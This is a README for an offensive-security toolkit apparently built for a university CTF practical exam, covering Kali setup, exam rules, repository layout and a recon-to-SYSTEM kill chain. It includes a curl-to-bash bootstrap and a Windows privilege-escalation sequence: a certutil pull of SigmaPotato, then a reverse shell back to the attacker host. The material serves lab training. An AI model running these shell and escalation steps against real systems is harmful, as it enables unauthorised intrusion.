# PTD Exam Toolkit

Self-contained Kali toolkit for the **ISEC3002** CTF practical. Clone it onto the Kali box,
run `setup.sh`, and work from the cheat sheets. Built for **SPEED**: recon → foothold →
Windows privesc, copy-paste first.

## Quick start — fresh Kali (one command)
Download and run the bootstrap straight from GitHub (public repo, no login). It installs deps,
clones the repo, builds wordlists/aliases, and fetches the binaries:
```bash
curl -fsSL https://raw.githubusercontent.com/HellFireInfernoStorm/ptd-toolkit/main/bootstrap.sh | bash
```
Then load the aliases into your current shell (new terminals do it automatically):
```bash
source ~/ptd-toolkit/aliases.sh
```
Toggles: `SKIP_APT=1` (skip apt), `SKIP_FETCH=1` (skip binary download), `DEST=/path` (clone elsewhere).

**Printable cheatsheet:** `PTD-Cheatsheet.pdf` (repo root) bundles all 8 cheat sheets into one styled PDF —
handy to open on a second screen while you work in the terminal. Grab it on any machine without cloning:
```bash
wget https://github.com/HellFireInfernoStorm/ptd-toolkit/raw/main/PTD-Cheatsheet.pdf
```

## Exam rules baked into every file
- Reverse-shell/listener ports: **4444 (foothold) · 5555 (privesc) · 6666 (spare)** — nothing else.
- **Metasploit allowed ONCE.** `msfvenom` + `nc`/`multi-handler` listeners do NOT count. Spend the one
  `msfconsole` use on a foothold exploit, never privesc (manual privesc = bonus marks).
- **Be gentle:** no `-T5`, no loud brute-force (aggressive scans get your IP blacklisted).
- Passwords are **top ~250 of rockyou** or uncrackable — stop after 2–3 min, one user.
- Kali serves payloads on **:8081** (kept clear of the shell ports).

## 1. Manual setup (what `bootstrap.sh` does for you)
```bash
git clone https://github.com/HellFireInfernoStorm/ptd-toolkit.git && cd ptd-toolkit
bash setup.sh            # installs apt deps (sudo), builds wordlists, writes aliases, checks tools
source aliases.sh        # sett/seti/vars + nmapfast/smbnull/serve/l4/l5/l6/winrev...
```
`setup.sh` auto-installs the Kali packages the toolkit needs (`enum4linux-ng`, `freerdp3-x11`, …) and
symlinks `xfreerdp → xfreerdp3`. Run `SKIP_APT=1 bash setup.sh` to skip the apt step.
Pull the privesc/enum binaries (needs internet; they're **gitignored**, not stored in the repo):
```bash
bash scripts/fetch-binaries.sh   # pulls SigmaPotato, winPEAS, linpeas, nc.exe, pspy...
ls -la payloads/                 # verify each file size > 0
```

## 2. Set the target, then go
```bash
sett 10.10.10.10     # export RHOST + export LHOST (auto-detected); `vars` to check
bash scripts/recon.sh $RHOST     # gentle allports -> services -> hints
```
Then follow **cheatsheets/00-KILLCHAIN.md** top to bottom.

## 3. Layout
| Path | What |
|------|------|
| `cheatsheets/00-SETUP.md` | fresh-Kali setup + full guide to every script/alias/function |
| `cheatsheets/00-KILLCHAIN.md` | ⭐ master driver — start here on a box |
| `cheatsheets/01-recon-enum.md` | gentle nmap + per-service enum |
| `cheatsheets/02-foothold.md` | 4 foothold archetypes (SMB/FTP/exploit/web) |
| `cheatsheets/03-shells.md` | reverse shells + listeners + TTY upgrade |
| `cheatsheets/04-win-privesc.md` | ⭐ SeImpersonate→SigmaPotato→SYSTEM + more |
| `cheatsheets/05-lin-privesc.md` | cron/sudo/SUID/caps/kernel |
| `cheatsheets/06-passwords.md` | hash-ID, crack, gentle guess |
| `cheatsheets/07-transfer.md` | serve :8081, certutil pull, exfil |
| `scripts/recon.sh` | ⭐ thorough **port-agnostic** recon — detects services on any port, enum + searchsploit + auto web dir-scan + hints, streams to terminal & `loot/` |
| `scripts/listen.sh [port]` | rlwrap nc listener (4444/5555/6666) |
| `scripts/serve.sh [port]` | http.server over payloads/ (:8081) |
| `scripts/fetch-binaries.sh` | download privesc/enum binaries (run at home) |
| `payloads/` | reverse-shells.txt, msfvenom templates, staged binaries |
| `wordlists/` | rockyou-top250/1000, season-pattern (built by setup.sh) |
| `loot/` | gitignored scratch — nmap out, screenshots, creds |

## 4. Helper commands (after `source aliases.sh`)
> Several are shell **functions** (`sett`, `seti`, `vars`, `nmapsvc`, `winrev`, `venexe`), so
> `type <name>` lists them — not `alias`. The rest (`nmapfast`, `smbnull`, `serve`, `l4`…) are aliases.

**Targeting:** `sett <ip>` set RHOST + auto LHOST (route to target) · `seti <iface>` override LHOST · `vars` show them.
**Recon:** `recon [ip]` full port-agnostic recon · `nmapfast $RHOST` · `nmapsvc <ports>`.
**Services (take the REAL port):** `smbnull [port]` · `smap [port]` · `web <port>` · `gob <port>` · `fuzz <url>` · `rdp u p [port]` · `winrm u p [port]` · `ssql u p [port]`.
**Shells/serve (your fixed ports):** `l4`/`l5`/`l6` listeners · `serve` (:8081) · `smbserve` · `winrev [port]` Windows rev-shell · `venexe [port]` msfvenom exe.
**Evidence:** `ev <cmd…>` run a command showing it + tee output to `loot/`.

Full usage guide with examples: `cheatsheets/00-SETUP.md` (also in the PDF).

## 5. Exam day, in one breath
1. `sett $IP` → `bash scripts/recon.sh $IP`
2. Pick a foothold archetype → get a shell on **4444** (`l4`).
3. `whoami /priv`. SeImpersonate? → serve 8081, `certutil` pull `SigmaPotato.exe`, `l5`,
   `sp.exe --revshell $LHOST 5555` → **SYSTEM**.
4. `type` each flag; screenshot every step for the report.

> Deeper "why" notes live in the project's `context/concepts/` — those do **not** ship here;
> this repo is the exam-day artifact.
